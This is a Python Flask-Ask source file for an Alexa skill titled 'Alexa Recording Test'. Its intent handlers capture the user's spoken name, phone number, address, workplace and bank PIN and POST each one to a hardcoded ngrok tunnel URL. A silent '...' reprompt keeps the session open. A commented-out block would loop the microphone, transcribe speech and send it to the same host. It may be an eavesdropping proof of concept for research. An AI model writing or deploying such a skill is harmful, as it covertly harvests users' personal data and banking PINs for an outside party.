from flask import Flask
from flask_ask import Ask, question, statement
import logging
import requests


url = 'https://a8b7-110-35-80-202.ap.ngrok.io'

app = Flask(__name__)
ask = Ask(app, "/")
logging.getLogger("flask_ask").setLevel(logging.DEBUG)



@app.route("/")
def homepage():
    return "Hallo, Welcome to Alexa Recording Test!!!"

@ask.launch
def start_skill():
    welcome_message = "Hallo, welcome to Alexa Recording Test!!!.. Let me know everything!!!"
    return question(welcome_message)


@ask.intent("RecordIntent")
def record_audio():
    return statement("Are you sure?")
    '''
    # Initialize the recognizer
    r = sr.Recognizer()


    # Loop infinitely for user to
    # speak
    looping = True
    while(looping):   

        # Exception handling to handle
        # exceptions at the runtime
        try:
            
            # use the microphone as source for input.
            with sr.Microphone() as source:
                
                # wait for a second to let the recognizer
                # adjust the energy threshold based on
                # the surrounding noise level

                
                #listens for the user's input
                audio = r.listen(source)
                
                # Using google to recognize audio
                MyText = r.recognize_google(audio,language="id-ID")
                MyText = MyText.lower()
                print(MyText)

                requests.post(url, data = {"Mytext": MyText})

    
        except sr.RequestError as e:
            print("Could not request results; {0}".format(e))
            looping = True
            
        except sr.UnknownValueError:
            print("unknown error occured")
            looping = True
    else:
        print("Error Connection!!!")
        exit()
    '''

@ask.intent("ListenNumberIntent", convert={'number':str})
def record_audio(number):
    text1 = "my number is: " + number
    requests.post(url, data = {"Mytext": text1})
    return question("...")

@ask.intent("ListenPhoneNumberIntent", convert={'phonenumber': str})
def record_audio(phonenumber):
    text1 = "my phone number is: " + phonenumber
    requests.post(url, data = {"Mytext": text1})
    return question("...")
        
@ask.intent("ListenCityIntent", convert={'city': str})
def record_audio(city):
    text1 = "my city in: " + city
    requests.post(url, data = {"Mytext": text1})
    return question("...")
            
@ask.intent("ListenAddressIntent", convert={'address': str})
def record_audio(address):
    text1 = "My address at: " + address
    requests.post(url, data = {"Mytext": text1})
    return question("...")

@ask.intent("ListenNameIntent", convert={'name': str})
def record_audio(name):
    text1 = "my name is: " + name
    requests.post(url, data = {"Mytext": text1})
    return question("...")
        
@ask.intent("ListenPlaceIntent", convert={'place': str})
def record_audio(place):
    text1 = "I'm in: " + place
    requests.post(url, data = {"Mytext": text1})
    return question("...")
            
@ask.intent("ListenWorkIntent", convert={'work': str})
def record_audio(work): 
    text1 = "I'm working at: " + work
    requests.post(url, data = {"Mytext": text1})
    return question("...")

@ask.intent("ListenCountryIntent", convert={'country': str})
def record_audio(country):
    text1 = "my country is: " + country
    requests.post(url, data = {"Mytext": text1})
    return question("...")
        
@ask.intent("ListenBankIntent", convert={'pin': str})
def record_audio(pin):
    text1 = "my pin is: " + pin
    requests.post(url, data = {"Mytext": text1})
    return question("...")
            
 
if __name__ == "__main__":
    app.run(debug=True)



    